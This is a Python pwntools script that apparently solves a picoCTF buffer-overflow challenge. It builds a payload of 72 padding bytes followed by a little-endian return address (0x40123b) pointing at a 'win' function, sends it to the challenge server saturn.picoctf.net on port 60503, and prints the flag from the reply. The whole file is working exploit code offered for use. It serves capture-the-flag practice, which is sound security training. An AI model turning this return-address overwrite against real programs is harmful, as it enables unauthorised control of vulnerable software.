from pwn import *
import sys

def reverse_str(str):
    chunks = [str[i:i+2] for i in range(0, len(str), 2)]

    chunks.reverse()

    hex_bytes = ['\\x' + chunk for chunk in chunks]
    return ''.join(hex_bytes)


def construct_payload(dist, win_addr, encode=False):
    payload = "A" * dist
    payload+=reverse_str(win_addr)
    if encode:
        return payload.encode().decode('unicode_escape').encode('latin1')
    return payload


def send_to_server(payload):
    host = 'saturn.picoctf.net'
    port = 60503
    conn = remote(host, port)
    conn.recvline()
    conn.sendline(payload)
    response = conn.recvall()
    conn.close()
    return response

def get_flag(output):
    index = output.find("picoCTF{")
    result = output[index:]  # substring from pattern to end
    return result


def execute():
    win_addr = "40123b"
    dist=72
    payload = construct_payload(dist, win_addr, True)
    server_output = send_to_server(payload)
    print(get_flag(server_output.decode('utf-8', errors='ignore')))


def generate_payload():
    win_addr = "40123b"
    dist=72
    payload = construct_payload(dist, win_addr)
    print(payload)

def main():
    if(len(sys.argv) <=1):
        print("Please enter operation")
        sys.exit()
    operation=sys.argv[1]
    
    if operation == "payload":
        generate_payload()
    elif operation == "execute":
        execute()
    else:
        print("Invalid operation")
main()